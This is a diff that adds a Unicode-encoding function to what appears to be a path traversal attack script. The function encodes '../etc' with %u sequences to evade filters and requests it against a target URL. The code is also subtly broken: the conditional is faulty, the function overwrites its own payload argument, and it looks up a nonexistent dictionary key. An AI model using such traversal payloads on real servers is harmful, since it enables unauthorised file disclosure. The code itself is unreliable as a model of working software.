@@ -27,3 +27,28 @@ def url_encoding(link, payload):
 
     else:
         print(f"Payload:{payload}{dots}status code {req.status_codes}")
+
+def unicode_encoding(link, payload):
+    uCode = {
+        "dot" : "%u002e",
+        "frwd_slash" : "%u2215",
+        "\\" : "%u2216"
+    }
+    payload = "../etc"
+    if "." and "/" in payload:
+        replacements = str.maketrans({
+            ".": uCode["dot"],
+            "/": uCode["frwd_slash"]
+        })
+        final_payload = payload.translate(replacements)
+
+        # make request using the unicode payload
+        ureq = req.get(f"{link}{final_payload}")
+
+
+    else: # remeber to deal with the \ bcoz of python intepreter
+        replacements = str.maketrans({
+            ".": uCode["dot"],
+            "\\": uCode["back_slash"]
+        })
+        final_payload = payload.translate(replacements)
